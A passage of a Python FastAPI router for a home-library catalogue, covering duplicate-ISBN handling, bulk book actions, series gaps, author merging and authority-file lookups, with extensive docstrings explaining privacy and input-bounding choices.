    """The 409 body for a book whose ISBN is already taken.

    Re-scanning a book already on the shelf is not a rare mistake, it is what
    happens on the second pass through a bookcase. Answering it with a bare
    sentence leaves the reader holding the book with nothing to press: they
    have to go and find it themselves to check it really is the same edition.
    So the id travels with the message and the UI offers to open it.

    **Only when the holder is visible to the caller.** The uniqueness check
    deliberately sees every row, private ones included, so returning the id
    unconditionally would turn a 409 into a way to confirm that a particular
    member owns a particular book, which is exactly what `is_private` promises
    it will not do. In that case the message goes back on its own.

    **What is withheld is the id, and nothing else is.** The two bodies are
    different shapes, a string against an object, so a caller can tell which
    case it got. That is not a leak to close: the 409 itself already says this
    ISBN is held by some row, whatever the body carries, and the only way to
    stop it saying so is to create the book and break the unique index. So the
    promise here is the narrow one, and `tests/routers/test_books.py::
    TestTheDuplicateConflictPointsAtTheBook` reads the body rather than the
    message, because a test on the message passes under either rule.
    """
    if holder.is_private and holder.added_by_user_id != current_user.id:
        return message
    # `book_id` is what the client offers two actions on: opening the book it
    # already has (a mis-scan, the common case) and adding another copy of it
    # (`POST /api/books/{book_id}/copies`). Both need the id and neither may
    # have it when the holder is somebody else's private book.
    return {"message": message, "book_id": holder.id}


def _freeable(holder: Book, current_user: User) -> bool:
    """Whether a trashed row may be cleared out of the way of a book being
    added again.

    Without this, deleting a book and re-scanning it reports "already exists"
    for a book the member cannot see anywhere, which is a worse bug than the
    one soft deletion fixes. `implementation.md` names mis-scan, delete,
    re-scan as the most common delete in this app, so it is also the common
    path rather than a corner.

    Purged rather than restored, so the outcome matches what deleting and
    re-adding has always done here: a fresh record. Restoring instead would
    silently hand back the record somebody had just rejected, which is exactly
    what a person who deleted it because its metadata was wrong does not want.
    Losing the undo window costs nothing: they are holding the book and adding
    it right now.

    **Only a row this member could have seen in their own trash.** Purging
    somebody else's trashed private book because their ISBN happened to match
    would destroy data they never offered up, and would confirm the book
    existed. That case keeps the 409.

    **A predicate and nothing else**, deliberately. It used to purge as well,
    which meant the caller could only ask about one row at a time without
    destroying it: see the note at the call site for what that cost once one
    ISBN could be held by several rows.
    """
    if holder.deleted_at is None:
        return False
    return not holder.is_private or holder.added_by_user_id == current_user.id


@router.post("", response_model=BookOut, status_code=status.HTTP_201_CREATED)
def add_book(payload: BookCreate, db: DbSession, current_user: CurrentUser) -> BookOut:
    return _create_book(payload, current_user, db, "Book with this ISBN already exists")


@router.post("/scan", response_model=BookOut, status_code=status.HTTP_201_CREATED)
def scan_add(payload: BookCreate, db: DbSession, current_user: CurrentUser) -> BookOut:
    """Confirm-add after an ISBN lookup. Same as POST /api/books, named for the
    scan flow so the client's intent is visible in logs and metrics."""
    return _create_book(payload, current_user, db, "Book with this ISBN already in catalog")


# ── Ownership ─────────────────────────────────────────────────────────────────
#
# Whether a copy is physically on the shelf, which is a fact about the object
# and not about any one reader. See OwnershipStatus for why it is separate from
# reading status.


@router.post("/bulk", response_model=BulkResult)
def bulk_action(
    payload: BulkRequest,
    db: DbSession,
    current_user: CurrentUser,
) -> BulkResult:
    """Apply one verb to a selection of books.

    One endpoint rather than one per verb, because every verb shares the same
    three steps: resolve the ids the caller may actually touch, apply, and
    report updated/unchanged/skipped. A route per verb would be a copy of the
    permission walk per verb, and the next one added would be the one that
    forgot it.

    A separate `/bulk/ownership` used to sit beside this with the same body,
    the same permission walk and an identical result shape. It was removed
    rather than carried into the first tagged release: two endpoints for one
    action is two places for the next change to have to land, and dropping one
    after a release is a breaking change rather than a tidy-up.
    """
    requested = set(payload.book_ids)
    books = Shelf.seen_by(db, current_user.id).where(Book.id.in_(requested)).all()
    # Skipped covers both halves of "not yours to change": ids that do not
    # exist and ids belonging to somebody else's private book. Distinguishing
    # them in the response would disclose which of the two it was.
    skipped = len(requested) - len(books)

    handler = _BULK_HANDLERS[payload.action]
    updated, unchanged = handler(db, books, payload.value, current_user)

    db.commit()
    return BulkResult(updated=updated, unchanged=unchanged, skipped=skipped)


def _bulk_add_tag(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    tag = _require_tag(db, value, current_user.id)
    updated = unchanged = 0
    for book in books:
        # **A Book at its ceiling is counted unchanged, which is true of that
        # Book and is not the whole truth.** A refusal and "it already had this
        # tag" are different answers and `BulkResult` has three buckets, the
        # third of which the caller computes from the permission walk. A fourth
        # is a response shape change, so the refusal is logged by `tags.attach`
        # and reported here as no change rather than as a change nobody made.
        already = any(existing.id == tag.id for existing in book.tags)
        if not already and attach(book, tag):
            updated += 1
        else:
            unchanged += 1
    return updated, unchanged


def _bulk_remove_tag(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    tag = _require_tag(db, value, current_user.id)
    updated = unchanged = 0
    for book in books:
        match = next((existing for existing in book.tags if existing.id == tag.id), None)
        if match is None:
            unchanged += 1
        else:
            book.tags.remove(match)
            updated += 1
    return updated, unchanged


def _bulk_set_status(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    try:
        new_status = ReadStatus(str(value))
    except ValueError:
        raise HTTPException(status_code=400, detail=f"{value!r} is not a reading status") from None

    # One statement for the selection, the same stamping the single-book route
    # uses, and the unchanged rule: all three on `Reading.mark_each`.
    return Reading.by(db, current_user.id).mark_each(
        [book.id for book in books], new_status
    )


def _bulk_set_ownership(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    try:
        new_ownership = OwnershipStatus(str(value))
    except ValueError:
        raise HTTPException(
            status_code=400, detail=f"{value!r} is not an ownership status"
        ) from None

    updated = unchanged = 0
    for book in books:
        if book.ownership == new_ownership:
            unchanged += 1
        else:
            book.ownership = new_ownership
            updated += 1
    return updated, unchanged


def _bulk_set_location(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    # An empty string clears the location, which is how a box gets unpacked.
    location = str(value).strip() if value is not None else ""
    if len(location) > LOCATION_MAX:
        raise HTTPException(status_code=400, detail="Location is too long")
    new_location = location or None

    updated = unchanged = 0
    for book in books:
        if book.location == new_location:
            unchanged += 1
        else:
            book.location = new_location
            updated += 1
    return updated, unchanged


def _bulk_set_collection(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    """File a selection into a collection, or unfile it.

    None and the empty string both clear, matching `_bulk_set_location`: a
    verb that can only add is a verb somebody has to undo one book at a time.
    An unknown id is a 400 from `_checked_collection` and changes nothing,
    because the whole selection is applied in one transaction.
    """
    if value is None or str(value).strip() == "":
        new_collection: int | None = None
    else:
        try:
            new_collection = int(str(value))
        except ValueError:
            raise HTTPException(
                status_code=400, detail="A collection id is required"
            ) from None
        _checked_collection(db, new_collection, current_user.id)

    updated = unchanged = 0
    for book in books:
        if book.collection_id == new_collection:
            unchanged += 1
        else:
            book.collection_id = new_collection
            updated += 1
    return updated, unchanged


def _bulk_delete(
    db: Session, books: list[Book], value: str | int | None, current_user: User
) -> tuple[int, int]:
    """Trash a selection. The same reversible delete as the single-book route.

    Bulk is where an accident is most expensive: this is the verb that runs
    against a few hundred selected rows at once.
    """
    for book in books:
        _trash(book, db)
    return len(books), 0


def _require_tag(db: Session, value: str | int | None, viewer_id: int) -> Tag:
    """The Tag a bulk verb names, or a refusal.

    The range check is not redundant, for the reason `_checked_collection`
    states above and by the same door: `BulkRequest.value` is deliberately
    loose, so this is where an id arrives having been validated by nothing. A
    Python int has no ceiling, so `{"value": 2**63}` passed `int()`, reached
    `db.get` and raised `OverflowError` from inside the driver, which is a
    **500** to a number a member typed. See `MAX_ROW_ID`.

    404 rather than a third answer, because an id the column cannot hold is an
    id no row can carry: the caller learns exactly what they learn from an id
    that is merely unused, which is also all there is to tell them.

    **And the same 404 for a Tag this caller may not be told about**, which is
    `tags.Vocabulary.writable`. Before it, a Tag whose every Book is hidden
    from the caller answered differently from an id nothing carries, so the
    bulk verbs were an existence oracle over the whole table by id. The two
    answers are now one, which is the sentence above made true rather than
    extended.
    """
    try:
        tag_id = int(str(value))
    except (TypeError, ValueError):
        raise HTTPException(status_code=400, detail="A tag id is required") from None
    if not 1 <= tag_id <= MAX_ROW_ID:
        raise HTTPException(status_code=404, detail="Tag not found")
    tag = db.get(Tag, tag_id)
    if tag is None or not Vocabulary.seen_by(db, viewer_id).writable(tag):
        raise HTTPException(status_code=404, detail="Tag not found")
    return tag


#: What every bulk verb is: the books the caller may actually touch, the loose
#: `value` out of the body, and the (updated, unchanged) it did.
_BulkHandler = Callable[[Session, list[Book], str | int | None, User], tuple[int, int]]

def _undispatched[Verb](dispatched: set[Verb], actions: set[Verb]) -> set[Verb]:
    """The symmetric difference between the verbs dispatched and the verbs there are.

    Symmetric rather than one sided: a member with no entry is a `KeyError` at
    `bulk_action`'s subscript and a 500 to any member who picks that verb, and
    an entry for a member the enum no longer carries is a handler nothing can
    reach. Both are answered by editing the table below, so both belong in one
    message.

    Takes its two sides rather than reading them, so a test can drive it with a
    synthetic enum.
    """
    return dispatched ^ actions


def _dispatch_table[Verb, Handler](
    handlers: dict[Verb, Handler], actions: set[Verb]
) -> dict[Verb, Handler]:
    """The verb table, or a refusal at import naming what disagrees.

    **The table is built through this rather than checked beside it**, so the
    refusal is not a statement standing on its own that can be deleted on its
    own. That deletion is silent: measured, an `if undispatched: raise` beside
    the table was removed with the tree otherwise intact and 7560 backend tests
    still passed.

    **The refusal holds exactly while the second argument is `set(BulkAction)`.**
    State the condition rather than a list of edits, because the edits are not
    deletions and there is more than one. Unwrapping the call and keeping the
    dict literal is one. The smaller one keeps the call, the wrapper, the `raise`
    and a message naming the right members, and compares the table against
    itself: `_dispatch_table(t, set(t))`. Measured, whole gate green on it, 7563
    passed and mypy clean, with the guard unable to refuse anything.

    Either way the guard drops to test time, where
    `tests/routers/test_books_bulk.py::TestEveryVerbHasAHandler` goes red the
    moment a verb actually goes missing, and not before.

    Deleting the `raise` below fails `::TestTheTableRefusesToBuild` by name, and
    those four arms are the only thing that sees it go: with the `raise` and that
    class both removed, 7559 passed.
    """
    undispatched = _undispatched(set(handlers), actions)
    if undispatched:
        raise RuntimeError(
            "BulkAction and the bulk dispatch table disagree, so /books/bulk "
            "either raises KeyError on a verb it accepts or carries a handler "
            f"nothing reaches: {sorted(str(verb) for verb in undispatched)}. "
            "Give a new member an entry in _BULK_HANDLERS, or drop the entry "
            "whose member is gone."
        )
    return handlers


#: Refused when this module loads, not at the first request that names the verb.
#:
#: `bulk_action` subscripts this table with an action pydantic has already
#: validated, and mypy does not exhaustiveness check a `dict` literal the way it
#: checks a `match`, so a member added to `BulkAction` and not here is a
#: `KeyError` and a **500** with nothing in the tree red about it.
#:
#: The verb set is not the only hole: a verb added to both sides reading `value`
#: its own way with no bound passes this untouched, which is how `_require_tag`
#: answered `2**63` with a 500 for months. That one is held by
#: `tests/routers/test_books_bulk.py::TestNoVerbTurnsAValueIntoA500`, which is
#: parametrised over `BulkAction` rather than over a list of verb names.
_BULK_HANDLERS: dict[BulkAction, _BulkHandler] = _dispatch_table(
    {
        BulkAction.ADD_TAG: _bulk_add_tag,
        BulkAction.REMOVE_TAG: _bulk_remove_tag,
        BulkAction.SET_STATUS: _bulk_set_status,
        BulkAction.SET_OWNERSHIP: _bulk_set_ownership,
        BulkAction.SET_LOCATION: _bulk_set_location,
        BulkAction.SET_COLLECTION: _bulk_set_collection,
        BulkAction.DELETE: _bulk_delete,
    },
    set(BulkAction),
)


# ── Browsing by series and by shelf ───────────────────────────────────────────
#
# Declared before /{book_id}, like /export above: FastAPI matches in
# declaration order, so the reverse order makes each of these a request for the
# book with id "series".


@router.get("/series", response_model=list[SeriesOut])
def list_series(db: DbSession, current_user: CurrentUser) -> list[SeriesOut]:
    """Every series on the shelf, with the gaps in it.

    "Which ones are we missing" is the question a series view exists to answer,
    and it is answered here rather than in the client so the whole catalogue is
    considered rather than the current page.
    """
    rows = (
        Shelf.seen_by(db, current_user.id)
        .select(Book.series_name, Book.series_index)
        .filter(Book.series_name.isnot(None))
        .all()
    )

    # Counts and indexes tracked separately: a series can hold books nobody has
    # numbered, and counting the indexes would report such a series as empty.
    counts: dict[str, int] = {}
    indexes: dict[str, set[int]] = {}
    for name, index in rows:
        counts[name] = counts.get(name, 0) + 1
        indexes.setdefault(name, set())
        # Only whole numbers participate in the gap calculation. A 2.5 novella
        # is not a missing volume and must not make 2 or 3 look absent.
        if index is not None and float(index).is_integer():
            indexes[name].add(int(index))

    result: list[SeriesOut] = []
    for name in sorted(counts):
        held = indexes[name]
        # Only gaps *below* the highest number held. A series with no known
        # length has no meaningful "missing" past the end, and reporting one
        # would invent a book nobody has said exists.
        #
        # **And never above `MAX_SERIES_INDEX`, which is what stops one row
        # costing every member the request.** Unclamped this would build a set
        # and a sorted list of every integer below the highest number held, so
        # the cost would be linear in a value read out of the database rather
        # than in the number of books. Measured that way on one row at
        # 2,000,000: 14,888,944 bytes and 1,999,999 entries, from a library of
        # one book, with an eight character series name, which the response
        # carries and the figure therefore counts.
        #
        # Bounding the three request bodies is not enough on its own and that
        # is the reason this line exists rather than trusting them.
        # `backup.restore` inserts through Core, where neither pydantic nor a
        # `@validates` runs, and an instance upgraded from a release before
        # 2026-09-03 carries whatever its enrichment route stored before that
        # route was bounded. Truncating rather than refusing keeps the gaps a
        # member can act on and drops only the part of the range no API path
        # could have produced.
        #
        # One test for "nothing numbered" rather than two: a ceiling of 0 makes
        # the range empty, which is the answer the second arm used to return.
        ceiling = min(max(held), MAX_SERIES_INDEX) if held else 0
        missing = sorted(set(range(1, ceiling + 1)) - held)
        result.append(
            SeriesOut(name=name, book_count=counts[name], missing_indexes=missing)
        )
    return result


# ── Authors ───────────────────────────────────────────────────────────────────
#
# Declared here, above `/{book_id}`, for the reason `/series` and `/export` are:
# FastAPI matches in declaration order, so `/authors` written after `/{book_id}`
# is a request for the book with id "authors".
#
# There is no author table. An author is a name inside `books.author`, and these
# endpoints group the column exactly as `list_series` groups `series_name`. The
# one thing that is stored is `author_aliases`, which holds decisions rather than
# data: see `models.AuthorAlias` and `docs/decisions.md`.
#
# Everything below is a thin call into `authorship.py`, which owns both halves of
# author identity: the pure rules in `authors.py` and the queries and writes that
# used to sit here. The 404-not-403 rule is the one thing these handlers still
# do themselves, because it is an HTTP answer rather than a rule about names.

def _author_not_found() -> HTTPException:
    """Absent and forbidden reported identically, exactly as
    `dependencies._not_found` does for a book: a 403 would confirm that
    somebody owns a book by that name.

    A fresh instance per raise, for the reason that function records.
    """
    return HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Author not found")


@router.get("/authors", response_model=list[AuthorOut])
def list_authors(db: DbSession, current_user: CurrentUser) -> list[AuthorOut]:
    """Everybody credited on the shelf, with what the shelf knows about them.

    Unpaginated, like `/series` and `/locations`. The page it backs is a browse
    of the whole catalogue and filters in the browser, so paging it would trade
    a list nobody scrolls for a request per keystroke. One entry per name, each
    a name, a count and the spellings behind it, which is a smaller payload per
    row than `/duplicates` already returns unpaginated with a whole `BookOut`
    per book.
    """
    return Authorship.seen_by(db, current_user.id).listing()


@router.get("/authors/suggestions", response_model=list[AuthorSuggestionOut])
def list_author_suggestions(
    db: DbSession,
    current_user: CurrentUser,
    matcher: Annotated[
        MatcherName,
        Query(description="Which matching strategy proposes the groups"),
    ] = MatcherName.DEFAULT,
) -> list[AuthorSuggestionOut]:
    """Names that are probably one person, and what folding them would keep.

    A suggestion and never a verdict: it is offered because accepting one
    writes an alias row and deleting that row puts the shelf back exactly as it
    was. `reasons` records which rule produced each group so a reader can tell a
    near-certainty from a guess before pressing anything.

    `matcher` names the strategy. `default` is every rule. `exact` keeps only
    the rules that group on an equal value, a shared authority record or one
    name that is another with the spaces moved, and drops the two that compare
    names in pairs. A matcher can only ever take rules away, so no strategy
    proposes a group `default` does not.

    **`keep_name` is what `POST /authors/merge/batch` would fold each group
    into**, so this list is the review a batch is confirmed against rather than
    a summary of one. Null means the group is held back: applying it would
    repoint an alias row somebody already wrote, and a merge somebody made
    outranks a rule's guess. Nothing says whose row it was, which is not this
    caller's to know.

    Nothing here writes.
    """
    return Authorship.seen_by(db, current_user.id).suggestions(MATCHERS[matcher])


@router.get("/authors/wikipedia", response_model=list[AuthorWikipediaOut])
async def author_wikipedia(
    db: DbSession,
    current_user: CurrentUser,
    lang: Locale = Locale.EN,
) -> list[AuthorWikipediaOut]:
    """An outward Wikipedia link per author, in the reader's language.

    **Declared before `/authors/{...}` would be**, because FastAPI matches in
    declaration order and the literal path has to win.

    **At most ten requests**, and **the same limiter as the authority lookups on
    purpose**: it is the same host budget, so two counters would let a caller
    spend it twice.
    """
    authority_limiter.check(current_user.username)
    items: dict[str, str] = {}
    for author in Authorship.seen_by(db, current_user.id).listing():
        for row in author.identifiers:
            if row.scheme is AuthorityScheme.WIKIDATA:
                items[author.key] = row.identifier
                break
    if not items:
        return []

    # The reader's own language first, then the app's other one. Derived from
    # the enum rather than written out, so a third locale is translated and
    # linked in one edit instead of being translated and silently unlinked.
    prefer = (lang.value, *(other.value for other in Locale if other is not lang))
    found = await authority.wikipedia_articles(
        tuple(items.values()),
        prefer=prefer,
        deadline=authority.deadline_from_now(),
    )
    return [
        AuthorWikipediaOut(key=key, url=article.url, language=article.language)
        for key, item in items.items()
        if (article := found.get(item)) is not None
    ]


@router.post("/authors/merge", response_model=AuthorOut)
def merge_authors(
    payload: AuthorMergeRequest, db: DbSession, current_user: CurrentUser
) -> AuthorOut:
    """Say that these spellings are one person.

    **Nothing in `books` is written.** Every named author keeps its credit line
    exactly as printed, and what changes is one row per spelling saying who
    that spelling means. Deleting the row undoes it, and a later import that
    re-creates the spelling is folded by the row that is already there.

    Any member, like creating and renaming a collection, and for the same
    reason: it is reversible, and a shelf only an admin can tidy is one nobody
    tidies. Unlike deleting a collection, which is admin only because it
    strips a label off every book with no undo.

    An author nobody can see is **404, not 403**, exactly as a private book is:
    a 403 would confirm that somebody owns a book by that name.

    A `keep_name` that no book carries is allowed and is the point: "Le Guin,
    Ursula K." splits into two people, neither spelled correctly, and the
    repair is a name typed by hand. One that is itself already folded into
    somebody resolves to that somebody, so the mapping stays one lookup deep.

    How that is carried out is `authorship.Authorship.merge`.
    """
    try:
        return Authorship.seen_by(db, current_user.id).merge(
            payload.keys, payload.keep_name, by_user_id=current_user.id
        )
    except AuthorNotFound:
        raise _author_not_found() from None


@router.post("/authors/merge/batch", response_model=AuthorBatchMergeOut)
def merge_authors_batch(
    payload: AuthorMergeBatchRequest, db: DbSession, current_user: CurrentUser
) -> AuthorBatchMergeOut:
    """Fold several groups at once, or none of them.

    **What the caller confirmed, not what a matcher proposed.** The groups are
    applied as sent, which is what makes `GET /authors/suggestions` a review rather
    than a decoration. Each group folds its spellings into one of its own names;
    a name none of them has is the single merge's job, because a batch that
    could invent a name could also fold away the name another group in the same
    request is keeping.

    **All of it or none of it.** Every group is checked before any row is
    written, so a refusal leaves the library exactly as it was and there is no
    half applied state for anybody to reconstruct. Nothing in `books` is
    written by any of it, and deleting the rows undoes it one group at a time.

    An author nobody can see is **404**, exactly as it is for one merge. A group
    that would repoint an alias row somebody already wrote is **409**: a merge
    a person made is an assertion and a rule's grouping is a guess, so the
    assertion wins and the batch is refused rather than applied over it.
    """
    try:
        return Authorship.seen_by(db, current_user.id).merge_batch(
            payload.groups, by_user_id=current_user.id
        )
    except AuthorNotFound:
        raise _author_not_found() from None
    except DecisionStands as refused:
        raise HTTPException(
            status_code=status.HTTP_409_CONFLICT,
            detail=(
                "A merge somebody already made covers "
                f"{', '.join(refused.keys)}. Reload the proposal and try again."
            ),
        ) from None


@router.delete("/authors/aliases/{alias_id}", status_code=status.HTTP_204_NO_CONTENT)
def unmerge_author(alias_id: RowId, db: DbSession, current_user: CurrentUser) -> None:
    """Undo one merge. The spelling becomes its own author again.

    This is why merging is allowed to guess. Nothing was rewritten, so removing
    the row restores exactly the state before it was written, and the books
    were never involved.

    A row whose spelling is on no book this caller can see is **404**, and the
    reason is authority rather than secrecy: undo what you can see the effect
    of. The page offers this beside the spelling it folded, so a row with no
    such spelling on your shelf has no button here and no meaning here either.

    That leaves an **orphan** alias, whose spelling is on nobody's shelf because
    the book was deleted, unreachable and undeletable. Accepted: it maps a name
    nothing is credited with, so it changes no view, and it starts working again
    by itself if an import re-creates that spelling, which is the property the
    whole design is for.

    How that is carried out is `authorship.Authorship.unmerge`.
    """
    try:
        Authorship.seen_by(db, current_user.id).unmerge(alias_id)
    except AuthorNotFound:
        raise _author_not_found() from None


def _with_refusals(
    out: BookOut, recorded: RecordedAssertions
) -> BookOut:
    """The Book, carrying what a catalogue asserted and this Library declined.

    `model_copy` rather than a parameter on `book_to_out`: twenty call sites
    build a `BookOut` and two of them can ever have something to report, so the
    fact is attached where it arises instead of threaded through everything.
    """
    if not recorded.refused:
        return out
    return out.model_copy(
        update={
            "refused_identifiers": [
                RefusedAssertionOut(
                    name=row.name,
                    scheme=row.scheme,
                    asserted=row.asserted,
                    kept=row.kept,
                    kept_provenance=row.kept_provenance,
                )
                for row in recorded.refused
            ]
        }
    )


def _authority_out(candidate: authority.AuthorityCandidate) -> AuthorityCandidateOut:
    """One authority record as the API serves it."""
    return AuthorityCandidateOut(
        scheme=candidate.scheme,
        identifier=candidate.identifier,
        name=candidate.name,
        variants=list(candidate.variants),
        born=candidate.born,
        died=candidate.died,
        same_as=list(candidate.same_as),
        certain=candidate.certain,
        wikidata_id=candidate.wikidata_id,
        description=candidate.description,
        disagreements=[
            AuthorityDisagreementOut(
                about=row.about, lobid=row.lobid, wikidata=row.wikidata
            )
            for row in candidate.disagreements
        ],
    )


@router.get("/authors/authority", response_model=list[AuthorityCandidateOut])
async def author_authority(
    db: DbSession,
    current_user: CurrentUser,
    author: Annotated[
        str,
        Query(
            min_length=1,
            max_length=AUTHOR_NAME_MAX,
            description="An author key, or any spelling of the name",
        ),
    ],
    q: Annotated[
        str | None,
        Query(
            min_length=1,
            max_length=AUTHOR_NAME_MAX,
            description=(
                "Search the authority file for this name instead of the "
                "author's own. Forces the name search route."
            ),
        ),
    ] = None,
) -> list[AuthorityCandidateOut]:
    """What the authority files say about this author.

    **Two routes, and which one ran is on every row as `certain`.** Where a
    catalogue record for one of this author's Books already asserted a GND
    number, that number is a key: it resolves to exactly one record, and the
    spelling on it is the suggestion this feature exists to offer. Where it did
    not, the author's name is put to a name search, and a name is not a key.
    Two people are spelled `Stevenson, Robert Louis` in the GND.

    **`q` steers that search and forces it.** Without it the query is the
    author's own display name, which is exactly wrong when the shelf spells
    somebody in a form the GND does not use: the search then answers with the
    wrong people and there is no way to retype it. This is the one shape
    decision worth making before a client exists, because a client built
    against the narrower version would have to change to gain it.

    **Nothing here writes, on either route.** A suggestion is offered and may be
    overruled, which was settled on 2026-08-24: suggest the authority's spelling
    and let it be overwritten, while storing the reference either way. Taking a
    suggested spelling is `POST /authors/merge`, which already accepts a name
    typed by hand. Confirming an identifier from a name search is
    `POST /authors/identifiers`, which records that a person chose it.

    **Nothing here is stored either**, and most of it has no column to be
    stored in. The dates and the one line description are there so somebody can
    tell two same named people apart while they decide.
    `docs/featurelist.md` refuses author biographies and portraits, and this is
    the identity half of that line rather than an exception to it.

    An author nobody can see is **404, not 403**, exactly as a private book is.
    503 where the authority file could not be reached: nothing in this feature
    is blocked by it, so the client can offer "try again" rather than an error
    page.
    """
    # Its own limiter, not the catalogues'. lobid publishes 30 complex searches
    # a minute for its whole service and `METADATA_LIMIT` is 60 per member: see
    # `ratelimit.AUTHORITY_LIMIT`.
    authority_limiter.check(current_user.username)
    authorship = Authorship.seen_by(db, current_user.id)
    try:
        stored = authorship.identifiers_for(author)
    except AuthorNotFound:
        raise _author_not_found() from None

    # **One deadline for the whole lookup, and a ceiling on the fan out.**
    # Both were missing and the resolve branch had neither: it is one candidate
    # per identifier stored for the person, which is one per spelling folded
    # into them, and `fetch.get_once` gives every call its own budget when it is
    # passed none. `authority.DEADLINE_SECONDS` carries the measurement.
    deadline = authority.deadline_from_now()
    try:
        if q is not None:
            # A retyped name is a search whatever is stored: the member is
            # saying the shelf spelling is not the one to look up.
            found = await authority.search(q, deadline=deadline)
        elif stored:
            # One row per scheme per spelling. `resolve` answers None for a
            # number the file does not hold, which a hand edited row or a
            # retired GND record can produce.
            found = [
                candidate
                for candidate in await asyncio.gather(
                    *(
                        authority.resolve(row.identifier, deadline=deadline)
                        for row in stored[: authority.MAX_CANDIDATES]
                    )
                )
                if candidate is not None
            ]
        else:
            found = await authority.search(
                authorship.display_name(author), deadline=deadline
            )
    except authority.AuthorityUnavailable:
        raise HTTPException(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
            detail=(
                "Could not reach the authority file. Try again in a moment, or "
                "leave the name as it is."
            ),
        ) from None

    return [_authority_out(row) for row in found]


def _identifier_out(row: AuthorIdentifier, spelling: str) -> AuthorIdentifierOut:
    """One stored identifier as the API serves it.

    **The stored key's own spelling, never what the caller sent.** A client
    holds `AuthorOut.key` and posts it, so echoing the payload put
    `le guin ursula k` in a field whose own docstring says it is not the key.
    `Authorship` files the row under a spelling the shelf carries, and that is
    what a reader needs to see.
    """
    return AuthorIdentifierOut(
        id=row.id,
        spelling=spelling,
        scheme=row.scheme,
        identifier=row.identifier,
        provenance=row.provenance,
    )


async def _cross_references_for(identifier: str) -> dict[AuthorityScheme, str]:
    """What the confirmed GND record says this person is called elsewhere.

    **Resolved by the server, never read off the request body**, so a caller
    cannot name a record it did not confirm.

    **Two sources, and the second costs a request.** The GND record carries some
    of it; the rest is fetched.

    **The two are disjoint, and the `|` below is only a merge while they are.**
    That is load bearing rather than tidy: `|` takes the right hand value on a
    collision, which would silently prefer the fetched one.

    **Never raises, and an empty mapping is an ordinary answer**, because a
    person with no other names is not an error.
    """
    deadline = authority.deadline_from_now()
    try:
        candidate = await authority.resolve(identifier, deadline=deadline)
    except authority.AuthorityUnavailable:
        logger.info("Could not resolve a confirmed identifier for its cross references")
        return {}
    if candidate is None:
        return {}
    return authority.cross_references(candidate) | await authority.national_identifiers(
        candidate, deadline=deadline
    )


@router.post(
    "/authors/identifiers",
    response_model=ConfirmedIdentifierOut,
    status_code=status.HTTP_201_CREATED,
)
async def confirm_author_identifier(
    payload: AuthorIdentifierRequest,
    db: DbSession,
    current_user: CurrentUser,
) -> ConfirmedIdentifierOut:
    """Confirm that a candidate authority identifier is this author's.

    **This endpoint exists because a name is not a key.** An identifier belongs
    to a person, and only a member can say that this spelling is that person.

    **409, not 422, where the spelling already carries a different value**: the
    request is well formed and the state refuses it.

    **Confirming a GND number stores the cross references that came with it**,
    and the six national numbers, which cost the extra requests. A confirmation
    is up to eight outbound calls, which is why it is a deliberate action rather
    than something a lookup does on the way past.

    **Only for `gnd`**, the one scheme this app can resolve.

    **A cross reference colliding with a stored value is reported, not raised.**
    The confirmation is already committed, so failing here would report a write
    that happened as one that did not.
    """
    # The same limiter the search route uses, because this request now reaches
    # lobid too: without it, a client posting the same confirmation in a loop
    # makes an outbound request per call under no budget at all.
    authority_limiter.check(current_user.username)
    authorship = Authorship.seen_by(db, current_user.id)
    try:
        row = authorship.confirm_identifier(
            payload.author,
            payload.scheme,
            payload.identifier,
            by_user_id=current_user.id,
        )
    except AuthorNotFound:
        raise _author_not_found() from None
    except IdentifierConflict:
        raise HTTPException(
            status_code=status.HTTP_409_CONFLICT,
            detail="That spelling already carries a different identifier. Remove it first.",
        ) from None

    references = (
        await _cross_references_for(payload.identifier)
        if payload.scheme is AuthorityScheme.GND
        else {}
    )
    recorded = RecordedAssertions(stored=[], refused=[])
    if references:
        try:
            recorded = authorship.record_cross_references(
                payload.author, references, by_user_id=current_user.id
            )
        except AuthorNotFound:
            # Unreachable through this handler: `confirm_identifier` resolved
            # the same name a moment ago. Caught rather than trusted, because
            # the confirmation is already committed and a 404 here would report
            # a write that did happen as one that did not.
            logger.info("An author resolved for a confirmation and not for its siblings")

    spelling = authorship.spelling_for(row.author_key)
    return ConfirmedIdentifierOut(
        identifier=_identifier_out(row, spelling),
        cross_references=[
            _identifier_out(stored, authorship.spelling_for(stored.author_key))
            for stored in recorded.stored
        ],
        refused=[
            RefusedAssertionOut(
                name=refused.name,
                scheme=refused.scheme,
                asserted=refused.asserted,
                kept=refused.kept,
                kept_provenance=refused.kept_provenance,
            )
            for refused in recorded.refused
        ],
    )


@router.delete(
    "/authors/identifiers/{identifier_id}", status_code=status.HTTP_204_NO_CONTENT
)
def forget_author_identifier(
    identifier_id: RowId, db: DbSession, current_user: CurrentUser
) -> None:
    """Remove a wrong identifier. A later import may write it again.

    **The only correction there is**, and it is deliberately destructive rather
    than an edit: an upstream cluster can be wrong, and a fact that cannot be
    corrected is a trap. What is refused is retyping it to a different value,
    because that is the operation that turns somebody's guess into something
    that reads like a national library's assertion.

    A row whose spelling is on no book this caller can see is **404**, for the
    reason `unmerge_author` gives: authority rather than secrecy.

    How that is carried out is `authorship.Authorship.forget_identifier`.
    """
    try:
        Authorship.seen_by(db, current_user.id).forget_identifier(identifier_id)
    except AuthorNotFound:
        raise _author_not_found() from None


# ── Shelf locations ───────────────────────────────────────────────────────────


@router.get("/locations", response_model=list[LocationOut])
def list_locations(db: DbSession, current_user: CurrentUser) -> list[LocationOut]:
    """The distinct shelf locations in use, most-populated first.

    Doubles as the autocomplete source for the location field. Free text with
    no suggestions turns into six spellings of "living room" within a week.
    """
    rows = (
        Shelf.seen_by(db, current_user.id)
        .select(Book.location, func.count(Book.id))
        .filter(Book.location.isnot(None), Book.location != "")
        .group_by(Book.location)
        .order_by(func.count(Book.id).desc(), Book.location)
        .all()
    )
    return [LocationOut(name=name, book_count=count) for name, count in rows]


@router.get("/classifications", response_model=ClassificationFacets)
def list_classifications(
    db: DbSession, current_user: CurrentUser
) -> ClassificationFacets:
    """Every heading in the library and every Dewey division, each with a count.

